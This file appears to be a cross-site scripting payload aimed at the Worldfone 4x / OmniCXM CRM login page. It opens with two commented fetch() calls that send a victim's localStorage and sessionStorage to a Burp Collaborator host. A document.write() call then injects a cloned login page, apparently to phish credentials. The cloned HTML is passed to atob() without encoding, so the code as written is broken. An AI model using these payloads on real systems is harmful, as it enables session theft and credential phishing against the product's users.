// fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
// fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {method: "POST", body: 'localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
document.write(atob("    <html class="no-js k-webkit k-webkit105"><!--<![endif]--><head>
            <meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
            <title>Worldfone 4x - Login::Worldfone4X</title>
            <meta name="description" content="Worldfone4x OmniCXM CRM Contact Center Omnichannel">
            <meta name="author" content="South Telecom">
            <meta name="robots" content="noindex, nofollow">

            <!-- IMG -->
            <link rel="shortcut icon" href="https://omnicxm.worldfone.cloud/public/img/logo/favicon.ico">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon57.png" sizes="57x57">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon72.png" sizes="72x72">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon76.png" sizes="76x76">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon114.png" sizes="114x114">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon120.png" sizes="120x120">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon144.png" sizes="144x144">
            <link rel="apple-touch-icon" href="https://omnicxm.worldfone.cloud/public/img/logo/icon152.png" sizes="152x152">

            <!-- Start JQUERY -->
            <script src="https://omnicxm.worldfone.cloud/modules/jquery/jquery.min.js"></script>
            <script src="https://omnicxm.worldfone.cloud/modules/jquery/jquery.actual.js"></script>
            <script src="https://omnicxm.worldfone.cloud/modules/jquery/jquery.validate.min.js"></script>
            <!-- End JQUERY -->

            <script src="https://omnicxm.worldfone.cloud/modules/moment/moment.js"></script>

            <!-- Start BOOTSTRAP -->
            <link href="https://omnicxm.worldfone.cloud/modules/bootstrap/css/bootstrap.min.css" rel="stylesheet">
            <script src="https://omnicxm.worldfone.cloud/modules/bootstrap/js/bootstrap.min.js"></script>

            <link href="https://omnicxm.worldfone.cloud/modules/bootstrap-select/css/bootstrap-select.min.css" rel="stylesheet">
            <script src="https://omnicxm.worldfone.cloud/modules/bootstrap-select/js/bootstrap-select.min.js"></script>

            <link href="https://omnicxm.worldfone.cloud/modules/bootstrap-datetimepicker/css/bootstrap-datetimepicker.min.css" rel="stylesheet">
            <script src="https://omnicxm.worldfone.cloud/modules/bootstrap-datetimepicker/js/bootstrap-datetimepicker.min.js"></script>
            <!-- End BOOTSTRAP -->

            <!-- Start KENDO -->
            <link href="https://omnicxm.worldfone.cloud/modules/kendo/css/kendo.common-material.min.css" rel="stylesheet" type="text/css">
            <link href="https://omnicxm.worldfone.cloud/modules/kendo/css/kendo.material.min.css" rel="stylesheet" type="text/css">
            <link href="https://omnicxm.worldfone.cloud/modules/kendo/css/kendo.material.mobile.min.css" rel="stylesheet" type="text/css">
            <link href="https://omnicxm.worldfone.cloud/modules/kendo/css/kendo.dataviz.min.css" rel="stylesheet">
            <link href="https://omnicxm.worldfone.cloud/modules/kendo/css/kendo.dataviz.material.min.css" rel="stylesheet">

            <script src="https://omnicxm.worldfone.cloud/modules/kendo/js/kendo.all.min.js"></script>
            <script src="https://omnicxm.worldfone.cloud/modules/kendo/js/kendomuticheck.js"></script>
            <!-- End KENDO -->

            <script src="https://omnicxm.worldfone.cloud/modules/proui/pages/login_1.4.js"></script>
            <script src="https://omnicxm.worldfone.cloud/modules/amlichvietnam/alvn.js"></script> 
            <script src="https://omnicxm.worldfone.cloud/modules/sweetalert2/sweetalert2.11.min.js"></script>

            <style>.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4!important;grid-row:1/4!important;grid-template-columns:1fr 99fr 1fr;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 .625em #d9d9d9;pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:700}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.3125em;padding:0}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-styled:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(100,150,200,.5)}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.8em;left:-.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-toast-animate-success-line-tip .75s;animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-toast-animate-success-line-long .75s;animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{-webkit-animation:swal2-toast-show .5s;animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{-webkit-animation:swal2-toast-hide .1s forwards;animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(-webkit-min-content,auto) minmax(-webkit-min-content,auto) minmax(-webkit-min-content,auto);grid-template-rows:minmax(min-content,auto) minmax(min-content,auto) minmax(min-content,auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:0 0!important}.swal2-container.swal2-bottom-start,.swal2-container.swal2-center-start,.swal2-container.swal2-top-start{grid-template-columns:minmax(0,1fr) auto auto}.swal2-container.swal2-bottom,.swal2-container.swal2-center,.swal2-container.swal2-top{grid-template-columns:auto minmax(0,1fr) auto}.swal2-container.swal2-bottom-end,.swal2-container.swal2-center-end,.swal2-container.swal2-top-end{grid-template-columns:auto auto minmax(0,1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-left>.swal2-popup,.swal2-container.swal2-center-start>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-left>.swal2-popup,.swal2-container.swal2-bottom-start>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-fullscreen>.swal2-popup,.swal2-container.swal2-grow-row>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none!important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0,100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:0}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:#595959;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0,0,0,.1),rgba(0,0,0,.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;-webkit-animation:swal2-rotate-loading 1.5s linear 0s infinite normal;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 transparent #2778c4 transparent}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px transparent;font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7367f0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(115,103,240,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#ea5455;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(234,84,85,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7d88;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,125,136,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:0}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:#545454;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto!important;height:.25em;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:0 0;color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:0 0;color:#f27474}.swal2-close:focus{outline:0;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:#545454;font-size:1.125em;font-weight:400;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-checkbox,.swal2-file,.swal2-input,.swal2-radio,.swal2-select,.swal2-textarea{margin:1em 2em 0}.swal2-file,.swal2-input,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:inherit;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px transparent;color:inherit;font-size:1.125em}.swal2-file.swal2-inputerror,.swal2-input.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474!important;box-shadow:0 0 2px #f27474!important}.swal2-file:focus,.swal2-input:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:0;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-file::-moz-placeholder,.swal2-input::-moz-placeholder,.swal2-textarea::-moz-placeholder{color:#ccc}.swal2-file:-ms-input-placeholder,.swal2-input:-ms-input-placeholder,.swal2-textarea:-ms-input-placeholder{color:#ccc}.swal2-file::placeholder,.swal2-input::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 0;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:inherit;font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:inherit;color:inherit;font-size:1.125em}.swal2-checkbox,.swal2-radio{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-checkbox label,.swal2-radio label{margin:0 .6em;font-size:1.125em}.swal2-checkbox input,.swal2-radio input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:.25em solid transparent;border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{-webkit-animation:swal2-animate-error-icon .5s;animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{-webkit-animation:swal2-animate-error-x-mark .5s;animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-.25em;left:-.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-animate-success-line-tip .75s;animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-animate-success-line-long .75s;animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{-webkit-animation:swal2-rotate-success-circular-line 4.25s ease-in;animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:inherit;font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:transparent}.swal2-show{-webkit-animation:swal2-show .3s;animation:swal2-show .3s}.swal2-hide{-webkit-animation:swal2-hide .15s forwards;animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@-webkit-keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@-webkit-keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@-webkit-keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@-webkit-keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@-webkit-keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@-webkit-keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@-webkit-keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@-webkit-keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@-webkit-keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@-webkit-keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@-webkit-keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@-webkit-keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto!important}body.swal2-no-backdrop .swal2-container{background-color:transparent!important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll!important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static!important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:transparent;pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-left,body.swal2-toast-shown .swal2-container.swal2-top-start{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-left,body.swal2-toast-shown .swal2-container.swal2-center-start{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%,-50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-left,body.swal2-toast-shown .swal2-container.swal2-bottom-start{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}</style> 
            <!-- Start USERSCRIPT BEFORE -->
            <script type="text/javascript">
                var base_url = "https://omnicxm.worldfone.cloud/";
            </script>
        </head>
        <body>

    <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/public/css/login.css">
    <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/public/css/plugins.css">

        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/water.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/water2.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/metal.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/metal2.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/tree.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/tree2.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/fire.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/fire2.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/earth.css">
        <link rel="stylesheet" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/earth2.css">


    <link rel="stylesheet" data-name="element-css" href="https://omnicxm.worldfone.cloud/modules/proui/css/stel/water.css">

    <style type="text/css">
        body {
            -webkit-transition: background-image 0.5s ease-in-out;
            transition: background-image 0.5s ease-in-out;
            overflow: hidden;
        }
        svg .st0{fill:#fff;}
        .th-label-color-theme {
            position: relative;
            left: 25px;
            top: 3px;
            color: var(--main-text-color-login);
            font-weight: 350;
            font-size: 13px;
        }
        input.th-password {
            -webkit-text-security: disc;
        }
        .th-d-none {
            display: none !important;
        }
    </style>

    <div class="login-bg particle-network-animation"><canvas width="1536" height="150"></canvas></div>

    <div class="custom-center">
        <div class="container maincontent" data-role="tooltip">
            <div class="col-xs-6 col-sm-6 col-md-6 cot1">
                <div class="content-welcome" style="padding: 0;">
                    <div class="text-center" style="">
                        <span class="holiday" style="font-size: 20px; text-rendering: geometricPrecision;"></span>
                    </div>

                    <p class="time_content" style="padding: 0;margin: 0;">
                        <span id="time_clock">07:08:19</span><i><span id="ampm_time" class="ampm_time">PM</span></i>
                    </p>

                    <div class="row col-xs-12 col-sm-12 col-md-12 date_time">
                        <div class="col-xs-4 col-sm-4 col-md-4 day_col">
                            <span class="name_col">Day</span><br>
                            <span class="normalday">16</span><br>
                            <span class="lunarday hidden">21</span><br>
                            <span class="specialday hidden">Nhâm Thân (Kim)</span>
                        </div>
                        <div class="col-xs-4 col-sm-4 col-md-4 month_col">
                            <span class="name_col">Month</span><br>
                            <span class="normalday">09</span><br>
                            <span class="lunarday hidden">8</span><br>
                            <span class="specialday hidden">Kỷ Dậu (Thổ)</span>
                        </div>
                        <div class="col-xs-4 col-sm-4 col-md-4 year_col">
                            <span class="name_col">Year</span><br>
                            <span class="normalday">2022</span><br>
                            <span class="lunarday hidden"></span><br>
                            <span class="specialday hidden">Nhâm Dần (Kim)</span>
                        </div>
                    </div>

                    <div class="clearfix"></div>
